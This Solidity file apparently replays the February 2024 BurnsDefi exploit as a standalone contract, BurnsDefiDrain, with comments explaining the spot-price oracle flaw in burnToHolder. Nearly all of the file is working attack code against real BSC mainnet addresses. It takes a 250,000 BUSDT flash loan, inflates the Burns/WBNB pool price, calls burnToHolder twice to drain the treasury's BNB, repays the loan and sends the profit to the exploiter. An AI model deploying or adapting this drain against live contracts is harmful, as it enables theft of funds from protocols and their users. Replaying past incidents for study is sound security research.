// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-02-BurnsDefi).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the DODO flash-loan callback `DSPFlashLoanCall` lives on the test
// itself (`assetTo = address(this)`), so there is no standalone contract to
// deploy. This file is a faithful, self-contained copy of that inline attack
// (testExploit's flash-loan kickoff + DSPFlashLoanCall callback + the three
// private swap helpers + minimal inline interfaces — no imports so it
// compiles anywhere), compiled inside the registry forge project. Logic and
// constants are copied verbatim from test/BurnsDefi_exp.sol.
//
// Root cause: BurnsBuild.burnToHolder(amount, invitation) prices the BNB
// reward it pays out for burned "Burns" tokens using PancakeRouter's SPOT
// getAmountsOut() against the live Burns/WBNB pair reserves, with no TWAP,
// no sanity cap, and no freshness check (contracts_burnsBuild.sol:667). A
// Uniswap-V2-style spot reserve ratio is donation-manipulable within a single
// transaction: the attacker flash-borrows BUSDT, routes it BUSDT -> WBNB and
// dumps the WBNB into the Burns/WBNB pair (inflating WBNB's side of the pool,
// which inflates the BNB-per-Burns spot price), then calls burnToHolder()
// twice against that manipulated price to drain BurnsBuild's ~31 BNB
// treasury. The borrowed BUSDT is repaid by selling the leftover Burns tokens
// back through the same two pools; everything left over is profit.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IWETH is IERC20 {
    function deposit() external payable;
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniRouterV2 {
    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) external pure returns (uint256 amountOut);
    function getAmountsIn(uint256 amountOut, address[] memory path) external view returns (uint256[] memory amounts);
}

interface IDVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IBurnsBuild {
    function burnToHolder(uint256 amount, address _invitation) external;
    function receiveRewards(address to) external;
}

contract BurnsDefiDrain {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant Burns = IERC20(0x91f1d3C7ddB8d5E290e71f893baD45F16E8Bd7BA);
    IWETH constant WBNB = IWETH(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IDVM constant DSP = IDVM(0xD5F05644EF5d0a36cA8C8B5177FfBd09eC63F92F);
    IUniPairV2 constant BUSDT_WBNB = IUniPairV2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
    IUniPairV2 constant Burns_WBNB = IUniPairV2(0x928cd66dFA268C69a37Be93BF7759dc8Ee676Bf8);
    IUniRouterV2 constant PancakeRouter = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IBurnsBuild constant BurnsBuild = IBurnsBuild(0x4fb9657Ac5d311dD54B37A75cFB873b127Eb21FD);

    address immutable exploiter;

    constructor(address _exploiter) {
        exploiter = _exploiter;
    }

    // Step 1: flash-borrow 250,000 BUSDT from the DODO DSP pool. The pool
    // calls back DSPFlashLoanCall(...) once the BUSDT is already here.
    function attack() external {
        bytes memory data = abi.encodePacked(uint8(49));
        DSP.flashLoan(250_000 * 1e18, 0, address(this), data);
    }

    function DSPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // Step 2: route the borrowed BUSDT -> WBNB -> Burns, parking the
        // proceeds as extra WBNB inside the Burns/WBNB pair and pulling
        // freshly-manipulated-price Burns tokens back to this contract.
        BUSDTToBurns(baseAmount);

        address[] memory path = new address[](2);
        path[0] = address(Burns);
        path[1] = address(WBNB);
        uint256 amountOut1 = 50e18;
        uint256 amountOut2 = address(Burns).balance - amountOut1;
        uint256[] memory amounts = PancakeRouter.getAmountsIn(amountOut1, path);

        // Step 3: THE BUG. burnToHolder() sizes its BNB reward off
        // PancakeRouter.getAmountsOut() against the just-inflated Burns/WBNB
        // spot reserves (contracts_burnsBuild.sol:667) — no TWAP, no cap.
        BurnsBuild.burnToHolder(amounts[0], exploiter);
        amounts = PancakeRouter.getAmountsIn(amountOut2, path);
        BurnsBuild.burnToHolder(amounts[0], exploiter);

        // Step 4: pull the credited BNB reward out of BurnsBuild.
        BurnsBuild.receiveRewards(address(this));
        WBNB.deposit{value: address(this).balance}();

        // Step 5: liquidate the WBNB + leftover Burns back to BUSDT.
        WBNBToBUSDT();
        BurnsToBUSDT();

        // Step 6: repay the flash loan; forward everything left to the
        // exploiter EOA as profit.
        BUSDT.transfer(address(DSP), baseAmount);
        BUSDT.transfer(exploiter, BUSDT.balanceOf(address(this)));
    }

    receive() external payable {}

    function BUSDTToBurns(uint256 amount) private {
        // Transfer borrowed BUSDT to the BUSDT/WBNB pair and obtain WBNB to
        // deposit into the Burns/WBNB pair.
        BUSDT.transfer(address(BUSDT_WBNB), amount);
        (uint112 reserveBUSDT, uint112 reserveWBNB,) = BUSDT_WBNB.getReserves();
        uint256 amountWBNB = PancakeRouter.getAmountOut(amount, reserveBUSDT, reserveWBNB);
        // Deposit WBNB straight into Burns/WBNB — this is the manipulation.
        BUSDT_WBNB.swap(0, amountWBNB, address(Burns_WBNB), "");

        (uint112 reserveBurns, uint112 _reserveWBNB,) = Burns_WBNB.getReserves();
        uint256 amountBurns = PancakeRouter.getAmountOut(amountWBNB, _reserveWBNB, reserveBurns);
        // Swap the deposited WBNB into Burns tokens.
        Burns_WBNB.swap(amountBurns, 0, address(this), "");
    }

    function WBNBToBUSDT() private {
        uint256 amountWBNB = WBNB.balanceOf(address(this));
        WBNB.transfer(address(BUSDT_WBNB), amountWBNB);
        (uint112 reserveBUSDT, uint112 reserveWBNB,) = BUSDT_WBNB.getReserves();
        uint256 amountBUSDT = PancakeRouter.getAmountOut(amountWBNB, reserveWBNB, reserveBUSDT);
        BUSDT_WBNB.swap(amountBUSDT, 0, address(this), "");
    }

    function BurnsToBUSDT() private {
        Burns.transfer(address(Burns_WBNB), Burns.balanceOf(address(this)));
        (uint112 reserveBurns, uint112 reserveWBNB,) = Burns_WBNB.getReserves();
        uint256 amountWBNB =
            PancakeRouter.getAmountOut(Burns.balanceOf(address(Burns_WBNB)) - reserveBurns, reserveBurns, reserveWBNB);
        Burns_WBNB.swap(0, amountWBNB, address(BUSDT_WBNB), "");

        (uint112 reserveBUSDT, uint112 _reserveWBNB,) = BUSDT_WBNB.getReserves();
        uint256 amountBUSDT = PancakeRouter.getAmountOut(amountWBNB, _reserveWBNB, reserveBUSDT);
        BUSDT_WBNB.swap(amountBUSDT, 0, address(this), "");
    }
}
